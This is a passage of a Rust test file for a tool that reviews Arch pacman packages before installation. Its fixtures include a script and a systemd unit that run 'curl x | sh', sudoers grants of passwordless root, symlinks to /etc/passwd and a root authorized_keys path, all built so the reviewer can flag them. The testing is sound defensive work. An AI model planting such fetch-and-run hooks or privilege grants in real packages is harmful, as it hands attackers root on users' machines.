//! Tests for the package archive model and the review of what a package ships.

use std::fs;
use std::os::unix::fs::symlink;
use std::path::Path;
use std::process::Command;

use super::{
    Archive, Entry, Kind, Resolution, lexical_target, parse_model, protected_violation, review,
    root_set_id, unescape,
};
use crate::config::model::SourceClass;
use crate::content::Content;
use crate::test_support::{TempDir, tool_available};

#[test]
fn names_are_unescaped_and_control_characters_refused() {
    assert_eq!(
        unescape(r"system-systemd\\x2dcryptsetup.slice").as_deref(),
        Some(r"system-systemd\x2dcryptsetup.slice")
    );
    assert_eq!(unescape(r"caf\303\251").as_deref(), Some("café"));
    assert_eq!(unescape(r"nl\nx"), None);
    assert_eq!(unescape(r"x\351"), None);
    assert_eq!(unescape(r"bad\q"), None);
}

#[test]
fn files_installed_setuid_or_setgid_root_are_told_apart() {
    assert_eq!(root_set_id("-rwsr-xr-x", "0", "0"), Some("setuid root"));
    assert_eq!(root_set_id("-rwSr--r--", "0", "100"), Some("setuid root"));
    assert_eq!(root_set_id("-rwxr-sr-x", "0", "0"), Some("setgid root"));
    // To another user or group, or not set at all.
    assert_eq!(
        root_set_id("-rwsr-xr-x", "1000", "0"),
        Some(super::SETUID_OTHER)
    );
    assert_eq!(
        root_set_id("-rwxr-sr-x", "0", "5"),
        Some(super::SETGID_OTHER)
    );
    assert_eq!(root_set_id("-rwxr-xr-x", "0", "0"), None);
    assert_eq!(root_set_id("-rwxr-xr-t", "0", "0"), None);
    let open = super::open_to_others;
    assert_eq!(
        open("-rwxrwxrwx", "0", "0", "usr/bin/tool"),
        Some(super::WRITABLE_BY_ALL)
    );
    assert_eq!(open("-rwxrwxr-x", "0", "0", "usr/bin/tool"), None);
    assert_eq!(open("-rw-rw-rw-", "0", "0", "var/lib/x/state"), None);
    // A directory anyone, its owner or its group may write into.
    assert_eq!(
        open(
            "drwxrwxrwx",
            "0",
            "0",
            "usr/lib/systemd/system/sshd.service.d"
        ),
        Some(super::WRITABLE_BY_ALL)
    );
    assert_eq!(open("drwxrwxrwt", "0", "0", "opt/app/tmp"), None);
    assert_eq!(
        open("-rwxr-xr-x", "1000", "0", "usr/bin/tool"),
        Some(super::OWNED_BY_OTHER)
    );
    assert_eq!(
        open("-rw-rw-r--", "0", "983", "etc/app.conf"),
        Some(super::WRITABLE_BY_GROUP)
    );
    assert_eq!(open("-rw-r-----", "0", "983", "etc/app.conf"), None);

    let names = ".PKGINFO\nusr/bin/x\nusr/bin/dir/\n";
    let details = [
        detail('-', 10, ".PKGINFO"),
        "-rwsr-xr-x  0 0      0           9 Sep 30 22:51 usr/bin/x".to_string(),
        "drwsr-sr-x  0 0      0           0 Sep 30 22:51 usr/bin/dir/".to_string(),
    ]
    .join("\n");
    let model = parse_model(names, &details).unwrap();
    let set: Vec<Option<&str>> = model.iter().map(|entry| entry.root_set_id).collect();
    assert_eq!(set, [None, Some("setuid root"), None]);
}

fn detail(kind: char, size: u64, rest: &str) -> String {
    format!("{kind}rw-r--r--  0 1000   1000   {size:>6} Sep 30 22:51 {rest}")
}

#[test]
fn the_model_zips_both_listings_with_any_owner_and_link_names() {
    let names = ".PKGINFO\netc/\netc/sudoers.d/a -> b\netc/sudoers.d/l\netc/sudoers.d/h\n";
    let details = [
        detail('-', 10, ".PKGINFO"),
        detail('d', 0, "etc/"),
        detail('-', 2, "etc/sudoers.d/a -> b"),
        detail('l', 0, "etc/sudoers.d/l -> ../x"),
        detail('h', 0, "etc/sudoers.d/h link to etc/sudoers.d/a -> b"),
    ]
    .join("\n");
    let model = parse_model(names, &details).unwrap();
    assert_eq!(
        model[2],
        Entry {
            path: "etc/sudoers.d/a -> b".into(),
            size: 2,
            kind: Kind::File,
            // Owned by uid 1000, under `/etc`.
            root_set_id: Some(super::OWNED_BY_OTHER)
        }
    );
    assert_eq!(model[3].kind, Kind::Symlink("../x".into()));
    assert_eq!(model[4].kind, Kind::HardLink("etc/sudoers.d/a -> b".into()));
    assert_eq!(model[1].path, "etc");
}

#[test]
fn the_model_refuses_what_libalpm_would_install_elsewhere() {
    let refused =
        |name: &str, kind: char| parse_model(&format!("{name}\n"), &detail(kind, 1, name)).is_err();
    for name in [
        "etc//sudoers.d/x",
        "etc/./sudoers.d/x",
        "/etc/sudoers.d/x",
        "usr/../etc/x",
        ".hidden",
        "./etc/x",
    ] {
        assert!(refused(name, '-'), "{name}");
    }
    // Metadata must be a regular file, and nothing may appear twice.
    assert!(refused(".INSTALL", 'l'));
    let twice = parse_model(
        ".INSTALL\n.INSTALL\n",
        &[detail('-', 1, ".INSTALL"), detail('-', 1, ".INSTALL")].join("\n"),
    );
    assert!(twice.is_err());
    // Hard links must name an earlier regular entry.
    assert!(parse_model("etc/x\n", &detail('h', 0, "etc/x link to etc/y")).is_err());
    // Entries under a symbolic-link directory, mismatched listings and
    // unknown types.
    assert!(
        parse_model(
            "etc/d\netc/d/x\n",
            &[detail('l', 0, "etc/d -> /etc"), detail('-', 1, "etc/d/x")].join("\n")
        )
        .is_err()
    );
    assert!(parse_model("a\nb\n", &detail('-', 1, "a")).is_err());
    assert!(parse_model("dev\n", &detail('c', 0, "dev")).is_err());
}

#[test]
fn protected_paths_need_their_owner() {
    let official = SourceClass::Official;
    let local = SourceClass::LocalPackage;
    assert!(protected_violation("etc/omarchy-guardian/config.toml", "evil", local, &[]).is_some());
    assert!(
        protected_violation("etc/omarchy-guardian/config.toml", "evil", official, &[]).is_some()
    );
    assert!(protected_violation("usr/bin/opencode", "opencode", official, &[]).is_none());
    assert!(
        protected_violation(
            "usr/bin/opencode",
            "opencode",
            SourceClass::ThirdPartyRepo,
            &[]
        )
        .is_some()
    );
    assert!(
        protected_violation(
            "usr/bin/opencode",
            "opencode-bin",
            SourceClass::ThirdPartyRepo,
            &["opencode-bin".into()]
        )
        .is_none()
    );
    assert!(protected_violation("usr/local/bin/claude", "anything", local, &[]).is_some());
    assert!(
        protected_violation("usr/lib/omarchy-guardian/x", "omarchy-guardian", local, &[]).is_none()
    );
    assert!(
        protected_violation(
            "usr/bin/bsdtar",
            "libarchive-git",
            SourceClass::ThirdPartyRepo,
            &[]
        )
        .is_some()
    );
    assert!(protected_violation("usr/bin/foo", "anything", local, &[]).is_none());
    // A permit or an allow list a package shipped would be root's file
    // like the real ones: no package ships one, Guardian's included.
    for package in ["evil", "omarchy-guardian"] {
        for path in [
            "var/lib/omarchy-guardian/permits/1000-pacman-abc",
            "var/lib/omarchy-guardian/sweep/allowed.json",
            "var/lib/omarchy-guardian",
        ] {
            assert!(
                protected_violation(path, package, official, &[]).is_some(),
                "{package} {path}"
            );
        }
    }
    // The audit trail's tools are the official packages' alone.
    for tool in ["usr/bin/logger", "usr/bin/journalctl"] {
        assert!(protected_violation(tool, "evil", local, &[]).is_some());
        assert!(protected_violation(tool, "util-linux", official, &[]).is_none());
    }
    // The gate itself comes from the user's own build or an official
    // repository, not from whichever repository offers that name.
    for path in [
        "usr/bin/omarchy-guardian",
        "usr/lib/omarchy-guardian/guardian-pacman-hook",
        "usr/share/omarchy-guardian/omarchy-guardian.hook",
    ] {
        assert!(protected_violation(path, "omarchy-guardian", local, &[]).is_none());
        assert!(protected_violation(path, "omarchy-guardian", official, &[]).is_none());
        assert!(
            protected_violation(path, "omarchy-guardian", SourceClass::ThirdPartyRepo, &[])
                .is_some(),
            "{path}"
        );
    }
}

fn build(root: &Path, archive: &Path, members: &[&str], extra: &[&str]) {
    let status = Command::new("/usr/bin/bsdtar")
        .arg("-cf")
        .arg(archive)
        .args(extra)
        .args(members)
        .current_dir(root)
        .status()
        .unwrap();
    assert!(status.success());
}

#[test]
fn reviews_the_scriptlet_auto_run_files_links_and_executed_scripts() {
    if !tool_available("/usr/bin/bsdtar") {
        return;
    }
    let dir = TempDir::new("payload");
    let root = dir.path().join("root");
    let units = root.join("usr/lib/systemd/system");
    fs::create_dir_all(units.join("multi-user.target.wants")).unwrap();
    fs::create_dir_all(root.join("etc/sudoers.d")).unwrap();
    fs::create_dir_all(root.join("usr/share/libalpm/hooks")).unwrap();
    fs::create_dir_all(root.join("usr/share/x")).unwrap();
    fs::write(root.join(".PKGINFO"), "pkgname = x\npkgver = 1-1\n").unwrap();
    fs::write(root.join(".INSTALL"), "post_install() { echo hi; }\n").unwrap();
    fs::write(units.join("x.service"), "[Service]\nExecStart=/usr/bin/x\n").unwrap();
    symlink(
        "../x.service",
        units.join("multi-user.target.wants/x.service"),
    )
    .unwrap();
    fs::write(
        root.join("etc/sudoers.d/x"),
        b"x ALL=(ALL) NOPASSWD: ALL # caf\xe9\n",
    )
    .unwrap();
    fs::write(
        root.join("usr/share/libalpm/hooks/x.hook"),
        "[Action]\nExec = /usr/share/x/run.sh\n",
    )
    .unwrap();
    fs::write(root.join("usr/share/x/run.sh"), "#!/bin/sh\ncurl x | sh\n").unwrap();
    let archive = dir.path().join("x-1-1-any.pkg.tar");
    build(
        &root,
        &archive,
        &[".PKGINFO", ".INSTALL", "usr", "etc"],
        &[],
    );

    let opened = Archive::open(&archive).unwrap();
    let reviewed = review(&opened, "x", SourceClass::LocalPackage, &[]).unwrap();
    assert_eq!(
        reviewed.install,
        Some(Content::Text("post_install() { echo hi; }\n".into()))
    );
    let paths: Vec<&str> = reviewed
        .files
        .iter()
        .map(|file| file.path.as_str())
        .collect();
    assert_eq!(
        paths,
        [
            "etc/sudoers.d/x",
            "usr/lib/systemd/system/multi-user.target.wants/x.service",
            "usr/share/libalpm/hooks/x.hook",
            "usr/share/x/run.sh",
        ]
    );
    assert!(
        matches!(&reviewed.files[0].content, Content::Lossy { text, .. } if text.contains("NOPASSWD"))
    );
    let Content::Text(unit) = &reviewed.files[1].content else {
        panic!()
    };
    assert!(unit.contains("ExecStart=/usr/bin/x"), "{unit}");
    let Content::Text(run) = &reviewed.files[3].content else {
        panic!()
    };
    assert!(
        run.contains("named in /usr/share/libalpm/hooks/x.hook") && run.contains("curl x | sh")
    );
    assert_eq!(reviewed.files[3].run_by, ["usr/share/libalpm/hooks/x.hook"]);
    opened.verify_unchanged().unwrap();

    // The declared name must be the transaction target.
    assert!(review(&opened, "y", SourceClass::LocalPackage, &[]).is_err());

    // Installed copies that match are recognised; a changed one is not.
    let installed = dir.path().join("installed");
    fs::create_dir_all(installed.join("etc/sudoers.d")).unwrap();
    fs::write(
        installed.join("etc/sudoers.d/x"),
        b"x ALL=(ALL) NOPASSWD: ALL # caf\xe9\n",
    )
    .unwrap();
    assert!(reviewed.files[0].is_installed_unchanged(&installed));
    fs::write(installed.join("etc/sudoers.d/x"), "x ALL=(ALL) ALL\n").unwrap();
    assert!(!reviewed.files[0].is_installed_unchanged(&installed));
}

#[test]
fn an_enabling_link_is_unchanged_only_while_its_unit_is() {
    if !tool_available("/usr/bin/bsdtar") {
        return;
    }
    let dir = TempDir::new("payload-enabled");
    let unit = "usr/lib/systemd/system/x.service";
    let link = "usr/lib/systemd/system/multi-user.target.wants/x.service";
    // The same tree is the package and, with another unit, the system.
    let lay_out = |name: &str, exec: &str| {
        let root = dir.path().join(name);
        fs::create_dir_all(root.join(link).parent().unwrap()).unwrap();
        fs::write(root.join(".PKGINFO"), "pkgname = x\n").unwrap();
        fs::write(root.join(unit), format!("[Service]\nExecStart={exec}\n")).unwrap();
        symlink("../x.service", root.join(link)).unwrap();
        root
    };
    let root = lay_out("package", "/usr/bin/sh -c 'curl x | sh'");
    let archive = dir.path().join("x-2-1-any.pkg.tar");
    build(&root, &archive, &[".PKGINFO", "usr"], &[]);
    let opened = Archive::open(&archive).unwrap();
    let reviewed = review(&opened, "x", SourceClass::LocalPackage, &[]).unwrap();
    let enabled = &reviewed.files[0];
    assert_eq!(enabled.path, link);

    // The link is the same; what it enables is not.
    let before = lay_out("before", "/usr/bin/x");
    assert!(!enabled.is_installed_unchanged(&before));
    assert!(enabled.is_installed_unchanged(&root));
}

#[test]
fn a_link_standing_in_for_an_auto_run_directory_is_refused() {
    if !tool_available("/usr/bin/bsdtar") {
        return;
    }
    assert_eq!(
        lexical_target("etc/xdg/systemd/user", "../../systemd/user").as_deref(),
        Some("etc/systemd/user")
    );
    assert_eq!(
        lexical_target("etc/cron.d", "/usr/share/x").as_deref(),
        Some("usr/share/x")
    );
    assert_eq!(lexical_target("etc/cron.d", "../../x"), None);
    // `lib` is a link on the system: the text says etc/cron.d, the
    // system goes to usr/etc/cron.d.
    assert_eq!(lexical_target("etc/cron.d", "../lib/../etc/cron.d"), None);
    assert_eq!(lexical_target("etc/cron.d", "/etc/x/../cron.d"), None);
    for (name, link, target) in [
        ("sleep", "etc/systemd/system-sleep", "/usr/share/x/run"),
        ("cron", "etc/cron.d", "/usr/share/x/run"),
        (
            "wants",
            "usr/lib/systemd/system/multi-user.target.wants",
            "/usr/share/x/run",
        ),
        // Through a name that may be a link, to files of another kind,
        // below a catalogued directory, or a unit directory in /etc.
        ("climb", "etc/cron.d", "../lib/../etc/cron.daily"),
        ("kind", "etc/sudoers.d", "../usr/local/bin"),
        ("below", "etc/xdg/systemd/user", "../../systemd/user/sub"),
        (
            "etc-wants",
            "etc/systemd/system/multi-user.target.wants",
            "/tmp",
        ),
    ] {
        let dir = TempDir::new(&format!("payload-dirlink-{name}"));
        let root = dir.path().join("root");
        fs::create_dir_all(root.join("usr/share/x/run")).unwrap();
        fs::create_dir_all(root.join(link).parent().unwrap()).unwrap();
        fs::write(root.join(".PKGINFO"), "pkgname = x\n").unwrap();
        fs::write(root.join("usr/share/x/run/job"), "#!/bin/sh\ncurl x | sh\n").unwrap();
        symlink(target, root.join(link)).unwrap();
        let archive = dir.path().join("x-1-1-any.pkg.tar");
        let members: Vec<&str> = [".PKGINFO", "etc", "usr"]
            .into_iter()
            .filter(|member| root.join(member).exists())
            .collect();
        build(&root, &archive, &members, &[]);
        let opened = Archive::open(&archive).unwrap();
        let error = review(&opened, "x", SourceClass::LocalPackage, &[])
            .err()
            .unwrap();
        assert!(
            error.to_string().contains("standing in for a directory"),
            "{name}: {error}"
        );
    }
}

#[test]
fn a_link_to_another_auto_run_directory_is_systemds_own_layout() {
    if !tool_available("/usr/bin/bsdtar") {
        return;
    }
    let dir = TempDir::new("payload-dirlink-systemd");
    let root = dir.path().join("root");
    fs::create_dir_all(root.join("etc/xdg/systemd")).unwrap();
    fs::create_dir_all(root.join("etc/systemd/user")).unwrap();
    fs::write(root.join(".PKGINFO"), "pkgname = systemd\n").unwrap();
    fs::write(
        root.join("etc/systemd/user/x.service"),
        "[Service]\nExecStart=/usr/bin/x\n",
    )
    .unwrap();
    symlink("../../systemd/user", root.join("etc/xdg/systemd/user")).unwrap();
    let archive = dir.path().join("systemd-1-1-any.pkg.tar");
    build(&root, &archive, &[".PKGINFO", "etc"], &[]);
    let opened = Archive::open(&archive).unwrap();
    let reviewed = review(&opened, "systemd", SourceClass::Official, &[]).unwrap();
    let paths: Vec<&str> = reviewed
        .files
        .iter()
        .map(|file| file.path.as_str())
        .collect();
    assert_eq!(paths, ["etc/systemd/user/x.service"]);
}

#[test]
fn links_out_of_the_package_or_through_links_are_notes_or_refusals() {
    if !tool_available("/usr/bin/bsdtar") {
        return;
    }
    let dir = TempDir::new("payload-links");
    let root = dir.path().join("root");
    fs::create_dir_all(root.join("etc/sudoers.d")).unwrap();
    fs::write(root.join(".PKGINFO"), "pkgname = x\n").unwrap();
    symlink(
        "/usr/lib/systemd/system/other.service",
        root.join("etc/sudoers.d/out"),
    )
    .unwrap();
    let archive = dir.path().join("x-1-1-any.pkg.tar");
    build(&root, &archive, &[".PKGINFO", "etc"], &[]);
    let opened = Archive::open(&archive).unwrap();
    assert_eq!(
        opened.resolve("etc/sudoers.d/out", "/usr/lib/systemd/system/other.service"),
        Ok(Resolution::Outside(
            "/usr/lib/systemd/system/other.service".into()
        ))
    );
    let reviewed = review(&opened, "x", SourceClass::LocalPackage, &[]).unwrap();
    assert!(
        matches!(&reviewed.files[0].content, Content::Text(text) if text.contains("does not ship"))
    );

    // Through `/lib` (a link to `usr/lib` on the system) the file the
    // package ships there is what the link leads to, `..` included.
    let root = dir.path().join("root3");
    fs::create_dir_all(root.join("etc/sudoers.d")).unwrap();
    fs::create_dir_all(root.join("usr/lib/pkg")).unwrap();
    fs::create_dir_all(root.join("usr/share")).unwrap();
    fs::write(root.join(".PKGINFO"), "pkgname = x\n").unwrap();
    fs::write(
        root.join("usr/lib/pkg/data"),
        "ALL ALL=(ALL) NOPASSWD: ALL\n",
    )
    .unwrap();
    fs::write(root.join("usr/share/rule"), "x\n").unwrap();
    let archive = dir.path().join("x3-1-1-any.pkg.tar");
    build(&root, &archive, &[".PKGINFO", "etc", "usr"], &[]);
    let opened = Archive::open(&archive).unwrap();
    for (target, leads) in [
        ("/lib/pkg/data", "usr/lib/pkg/data"),
        ("/lib64/pkg/data", "usr/lib/pkg/data"),
        ("/lib/../share/rule", "usr/share/rule"),
        ("../../lib/pkg/data", "usr/lib/pkg/data"),
    ] {
        assert_eq!(
            opened.resolve("etc/sudoers.d/x", target),
            Ok(Resolution::Regular(leads.into())),
            "{target}"
        );
    }

    // d -> /etc and e -> d/passwd: through a link, refused, host never read.
    let root = dir.path().join("root2");
    fs::create_dir_all(root.join("etc/sudoers.d")).unwrap();
    fs::write(root.join(".PKGINFO"), "pkgname = x\n").unwrap();
    symlink("/etc", root.join("etc/sudoers.d/d")).unwrap();
    symlink("d/passwd", root.join("etc/sudoers.d/e")).unwrap();
    let archive = dir.path().join("x2-1-1-any.pkg.tar");
    build(&root, &archive, &[".PKGINFO", "etc"], &[]);
    let opened = Archive::open(&archive).unwrap();
    assert!(review(&opened, "x", SourceClass::LocalPackage, &[]).is_err());
}

#[test]
fn a_space_in_the_owner_name_does_not_hide_a_sudoers_file() {
    if !tool_available("/usr/bin/bsdtar") {
        return;
    }
    let dir = TempDir::new("payload-owner");
    let root = dir.path().join("root");
    fs::create_dir_all(root.join("etc/sudoers.d")).unwrap();
    fs::write(root.join(".PKGINFO"), "pkgname = x\n").unwrap();
    fs::write(
        root.join("etc/sudoers.d/x"),
        "ALL ALL=(ALL) NOPASSWD: ALL\n",
    )
    .unwrap();
    let archive = dir.path().join("x-1-1-any.pkg.tar");
    build(
        &root,
        &archive,
        &[".PKGINFO", "etc"],
        &["--uname", "a b", "--gname", "c d"],
    );
    let opened = Archive::open(&archive).unwrap();
    let reviewed = review(&opened, "x", SourceClass::LocalPackage, &[]).unwrap();
    assert_eq!(reviewed.files.len(), 1);
    assert!(matches!(&reviewed.files[0].content, Content::Text(text) if text.contains("NOPASSWD")));
}

#[test]
fn a_protected_path_from_the_wrong_package_is_refused() {
    if !tool_available("/usr/bin/bsdtar") {
        return;
    }
    let dir = TempDir::new("payload-protected");
    let root = dir.path().join("root");
    fs::create_dir_all(root.join("etc/omarchy-guardian")).unwrap();
    fs::write(root.join(".PKGINFO"), "pkgname = x\n").unwrap();
    fs::write(
        root.join("etc/omarchy-guardian/config.toml"),
        "profile = \"local-only\"\n",
    )
    .unwrap();
    let archive = dir.path().join("x-1-1-any.pkg.tar");
    build(&root, &archive, &[".PKGINFO", "etc"], &[]);
    let opened = Archive::open(&archive).unwrap();
    let error = review(&opened, "x", SourceClass::Official, &[])
        .err()
        .unwrap();
    assert!(error.to_string().contains("disarm Guardian"), "{error}");
}

/// Misplaced files, a root link, a claim on Guardian's place, and the
/// newer auto-run places.
#[test]
fn what_a_package_grants_or_misplaces_is_seen_without_a_scriptlet() {
    if !tool_available("/usr/bin/bsdtar") {
        return;
    }
    let dir = TempDir::new("payload-grants");
    let as_root = ["--uid", "0", "--gid", "0"];
    let package = |name: &str, info: &str, files: &[(&str, &str)]| {
        let root = dir.path().join(name);
        fs::create_dir_all(&root).unwrap();
        fs::write(root.join(".PKGINFO"), format!("pkgname = {name}\n{info}")).unwrap();
        let mut members = vec![".PKGINFO".to_string()];
        for (path, text) in files {
            fs::create_dir_all(root.join(path).parent().unwrap()).unwrap();
            fs::write(root.join(path), text).unwrap();
            let top = path.split('/').next().unwrap().to_string();
            if !members.contains(&top) {
                members.push(top);
            }
        }
        (root, members)
    };
    let open = |root: &Path, members: &[String], name: &str| {
        let archive = dir.path().join(format!("{name}-1-1-any.pkg.tar"));
        let members: Vec<&str> = members.iter().map(String::as_str).collect();
        build(root, &archive, &members, &as_root);
        Archive::open(&archive).unwrap()
    };
    let refused = |archive: &Archive, name: &str| {
        review(archive, name, SourceClass::ThirdPartyRepo, &[])
            .err()
            .map(|error| error.to_string())
            .unwrap_or_default()
    };

    for (name, path, expected) in [
        (
            "a",
            "run/systemd/system-generators/x",
            "where no package's files belong",
        ),
        (
            "b",
            "root/.ssh/authorized_keys",
            "where no package's files belong",
        ),
        ("c", "lib/modules/x", "is a link to a directory in /usr"),
        ("c2", "usr/sbin/x", "is a link to a directory in /usr"),
        (
            "c3",
            "usr/lib64/libx.so",
            "is a link to a directory in /usr",
        ),
    ] {
        let (root, members) = package(name, "", &[(path, "x\n")]);
        let error = refused(&open(&root, &members, name), name);
        assert!(error.contains(expected), "{path}: {error}");
    }

    let (root, members) = package(
        "d",
        "replaces = omarchy-guardian\n",
        &[("usr/bin/d", "x\n")],
    );
    let error = refused(&open(&root, &members, "d"), "d");
    assert!(error.contains("remove or stand in for Guardian"), "{error}");
    let (root, members) = package(
        "e",
        "",
        &[
            ("etc/systemd/system.control/x.service", "[Service]\n"),
            ("usr/lib/initcpio/post/x", "#!/bin/sh\n"),
            ("usr/lib/python3.13/site-packages/x.pth", "import os\n"),
            ("etc/logrotate.d/x", "/var/log/x {}\n"),
        ],
    );
    let reviewed = review(
        &open(&root, &members, "e"),
        "e",
        SourceClass::ThirdPartyRepo,
        &[],
    )
    .unwrap();
    let paths: Vec<&str> = reviewed
        .files
        .iter()
        .map(|file| file.path.as_str())
        .collect();
    assert_eq!(paths.len(), 4, "{paths:?}");
}

#[test]
fn a_directory_anyone_may_write_into_is_a_grant() {
    use std::os::unix::fs::PermissionsExt;
    if !tool_available("/usr/bin/bsdtar") {
        return;
    }
    let dir = TempDir::new("payload-open-directory");
    let root = dir.path().join("root");
    let drop_ins = root.join("usr/lib/systemd/system/x.service.d");
    fs::create_dir_all(&drop_ins).unwrap();
    fs::write(root.join(".PKGINFO"), "pkgname = f\n").unwrap();
    fs::write(drop_ins.join("a.conf"), "[Service]\n").unwrap();
    fs::set_permissions(&drop_ins, fs::Permissions::from_mode(0o777)).unwrap();
    let archive = dir.path().join("f-1-1-any.pkg.tar");
    build(
        &root,
        &archive,
        &[".PKGINFO", "usr"],
        &["--uid", "0", "--gid", "0"],
    );
    let reviewed = review(
        &Archive::open(&archive).unwrap(),
        "f",
        SourceClass::ThirdPartyRepo,
        &[],
    )
    .unwrap();
    assert!(
        reviewed.root_set_id.contains(&(
            "usr/lib/systemd/system/x.service.d".to_string(),
            super::WRITABLE_BY_ALL
        )),
        "{:?}",
        reviewed.root_set_id
    );
}

#[test]
fn capabilities_and_access_lists_are_read_from_the_archive_headers() {
    fn block(name: &str, kind: u8, data: &[u8]) -> Vec<u8> {
        let mut header = vec![0_u8; 512];
        header[..name.len()].copy_from_slice(name.as_bytes());
        let size = format!("{:011o}", data.len());
        header[124..135].copy_from_slice(size.as_bytes());
        header[156] = kind;
        let mut out = header;
        out.extend_from_slice(data);
        out.resize(out.len().div_ceil(512) * 512, 0);
        out
    }
    fn record(key: &str, value: &str) -> String {
        let body = format!(" {key}={value}\n");
        let mut length = body.len() + 1;
        while format!("{length}{body}").len() != length {
            length = format!("{length}{body}").len();
        }
        format!("{length}{body}")
    }
    let mut tar = Vec::new();
    tar.extend(block("usr/bin/plain", b'0', b"x\n"));
    tar.extend(block(
        "PaxHeader/capped",
        b'x',
        (record("LIBARCHIVE.xattr.security.capability", "AQAAAoAAAAA=")
            + &record("SCHILY.xattr.security.capability", "\u{1}"))
            .as_bytes(),
    ));
    tar.extend(block("usr/bin/capped", b'0', b"x\n"));
    tar.extend(block(
        "PaxHeader/long",
        b'x',
        (record("path", "usr/share/a/long/name") + &record("SCHILY.acl.access", "user::rwx"))
            .as_bytes(),
    ));
    tar.extend(block("short", b'0', b""));
    tar.extend(block("usr/bin/after", b'0', b"y\n"));
    tar.extend(vec![0_u8; 1024]);
    assert_eq!(
        super::attributes_in_tar(tar.as_slice()).unwrap(),
        [
            (
                "usr/bin/capped".to_string(),
                super::WITH_CAPABILITIES,
                Some("AQAAAoAAAAA=".to_string())
            ),
            ("usr/share/a/long/name".to_string(), super::WITH_ACL, None)
        ]
    );
    // A stream that ends inside an entry is refused, not half read.
    let cut = &tar[..700];
    assert!(super::attributes_in_tar(cut).is_err());
}

/// A package archive `name` (owned by root) with `info` after its name
/// in `.PKGINFO`, an optional scriptlet, and `files`.
fn pack(
    dir: &Path,
    name: &str,
    info: &str,
    install: Option<&str>,
    files: &[(&str, &[u8])],
) -> std::path::PathBuf {
    let root = dir.join(format!("{name}-root"));
    fs::create_dir_all(&root).unwrap();
    fs::write(root.join(".PKGINFO"), format!("pkgname = {name}\n{info}")).unwrap();
    let mut members = vec![".PKGINFO".to_string()];
    if let Some(script) = install {
        fs::write(root.join(".INSTALL"), script).unwrap();
        members.push(".INSTALL".into());
    }
    for (path, bytes) in files {
        fs::create_dir_all(root.join(path).parent().unwrap()).unwrap();
        fs::write(root.join(path), bytes).unwrap();
        let top = path.split('/').next().unwrap().to_string();
        if !members.contains(&top) {
            members.push(top);
        }
    }
    let archive = dir.join(format!("{name}-1-1-any.pkg.tar"));
    let members: Vec<&str> = members.iter().map(String::as_str).collect();
    build(&root, &archive, &members, &["--uid", "0", "--gid", "0"]);
    archive
}

const ELF: &[u8] = b"\x7fELF\x02\x01\x01\0\0\0\0\0\0\0\0\0\x03\0\x3e\0";

#[test]
fn a_package_named_like_guardian_or_its_reviewer_needs_the_right_origin() {
    use super::name_violation;
    let third = SourceClass::ThirdPartyRepo;
    let local = SourceClass::LocalPackage;
    let official = SourceClass::Official;
    assert!(name_violation("omarchy-guardian", third, &[]).is_some());
    assert!(name_violation("omarchy-guardian", local, &[]).is_none());
    assert!(name_violation("omarchy-guardian", official, &[]).is_none());
    for reviewer in ["opencode", "claude-code"] {
        assert!(name_violation(reviewer, third, &[]).is_some(), "{reviewer}");
        assert!(name_violation(reviewer, local, &[]).is_some(), "{reviewer}");
        assert!(
            name_violation(reviewer, official, &[]).is_none(),
            "{reviewer}"
        );
        // The system configuration may trust that name from elsewhere.
        assert!(name_violation(reviewer, local, &[reviewer.to_string()]).is_none());
    }
    assert!(name_violation("opencode-bin", third, &[]).is_none());
    assert!(name_violation("anything", third, &[]).is_none());
}

#[test]
fn nobody_claims_guardians_place_and_only_an_owner_its_reviewers() {
    use super::claim_violation;
    let third = SourceClass::ThirdPartyRepo;
    let claims = |info: &str, package: &str, class, trusted: &[String]| {
        claim_violation(info, package, class, trusted).map(|(_, what)| what)
    };
    for key in ["replaces", "conflict", "provides"] {
        assert_eq!(
            claims(&format!("{key} = omarchy-guardian>=1\n"), "x", third, &[]),
            Some("Guardian"),
            "{key}"
        );
        // Not even an official package.
        assert_eq!(
            claims(
                &format!("{key} = omarchy-guardian\n"),
                "x",
                SourceClass::Official,
                &[]
            ),
            Some("Guardian")
        );
        for reviewer in ["opencode", "claude-code"] {
            let info = format!("pkgver = 1\n{key} = {reviewer}=2\n");
            assert_eq!(
                claims(&info, "x", third, &[]),
                Some("Guardian's reviewer"),
                "{key} {reviewer}"
            );
            assert_eq!(
                claims(&info, "x", SourceClass::LocalPackage, &[]),
                Some("Guardian's reviewer")
            );
            // A package that may ship the reviewer may also stand in
            // for it: an official one, or one the system trusts.
            assert_eq!(claims(&info, "x", SourceClass::Official, &[]), None);
            assert_eq!(claims(&info, "x", third, &["x".to_string()]), None);
        }
    }
    // A trusted reviewer package is not replaced by a stranger either.
    let trusted = ["opencode-bin".to_string()];
    assert_eq!(
        claims("conflict = opencode-bin\n", "x", third, &trusted),
        Some("Guardian's reviewer")
    );
    assert_eq!(
        claims(
            "provides = opencode\nconflict = opencode\n",
            "opencode-bin",
            third,
            &trusted
        ),
        None
    );
    // A package provides itself, and other names are nobody's business.
    assert_eq!(
        claims(
            "provides = omarchy-guardian=1\n",
            "omarchy-guardian",
            third,
            &[]
        ),
        None
    );
    assert_eq!(
        claims(
            "provides = libfoo.so=1\nconflict = foo-git\n",
            "x",
            third,
            &[]
        ),
        None
    );
    assert_eq!(
        claims(
            "depend = opencode\noptdepend = claude-code\n",
            "x",
            third,
            &[]
        ),
        None
    );
}

#[test]
fn a_package_of_guardians_name_must_be_guardian() {
    if !tool_available("/usr/bin/bsdtar") {
        return;
    }
    let dir = TempDir::new("payload-guardian-name");
    let refused = |archive: &Path, name: &str, class| {
        review(&Archive::open(archive).unwrap(), name, class, &[])
            .err()
            .map(|error| error.to_string())
            .unwrap_or_default()
    };
    // An empty "upgrade" from a third-party repository, or from
    // anywhere: installing it deletes the gate.
    let empty = pack(dir.path(), "omarchy-guardian", "pkgver = 99-1\n", None, &[]);
    let error = refused(&empty, "omarchy-guardian", SourceClass::ThirdPartyRepo);
    assert!(error.contains("third-party repository"), "{error}");
    for class in [SourceClass::LocalPackage, SourceClass::Official] {
        let error = refused(&empty, "omarchy-guardian", class);
        assert!(
            error.contains("does not ship /usr/bin/omarchy-guardian"),
            "{error}"
        );
    }
    let sub = TempDir::new("payload-guardian-name-full");
    let whole = pack(
        sub.path(),
        "omarchy-guardian",
        "",
        None,
        &[
            ("usr/bin/omarchy-guardian", ELF),
            (
                "usr/lib/omarchy-guardian/guardian-pacman-hook",
                b"#!/bin/sh\n",
            ),
        ],
    );
    assert_eq!(
        refused(&whole, "omarchy-guardian", SourceClass::LocalPackage),
        ""
    );
    let error = refused(&whole, "omarchy-guardian", SourceClass::ThirdPartyRepo);
